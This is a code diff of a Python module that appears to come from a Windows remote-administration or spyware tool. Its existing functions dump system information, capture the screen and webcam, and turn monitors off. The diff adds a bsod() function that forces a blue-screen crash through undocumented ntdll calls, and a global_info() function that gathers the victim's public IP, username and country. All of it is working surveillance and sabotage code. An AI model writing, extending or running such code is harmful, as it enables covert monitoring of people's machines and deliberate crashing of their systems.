@@ -1,10 +1,12 @@
-import os, time
+import os, time, requests, json
 from PIL import ImageGrab
 import pygame.camera
 import pygame.image
 
 from monitorcontrol import get_monitors
 from monitorcontrol import Monitor
+
+import ctypes
 
 def hostinfo(opdir):
     os.popen(f"systeminfo > {opdir}\\hostinfo.txt")
@@ -59,4 +61,17 @@ def monitor(state):
                     monitor.set_power_mode(4)
             except:
                 pass
-  
+
+def bsod():
+    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+    ctypes.windll.ntdll.NtRaiseHardError(0xDEADDD, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
+
+def global_info():
+    ip = requests.get("https://api.ipify.org").content.decode("utf-8")
+    username = os.getlogin()
+    ipdatajsonless = requests.get(f"http://ip-api.com/json/{ip}").content.decode("utf-8").replace('callback(', '').replace('})', '}')
+    ipdata = json.loads(ipdatajsonless)
+
+    country = ipdata["country"]
+
+    return f"IP: {ip}\nUsername: {username}\nCountry: {country}"
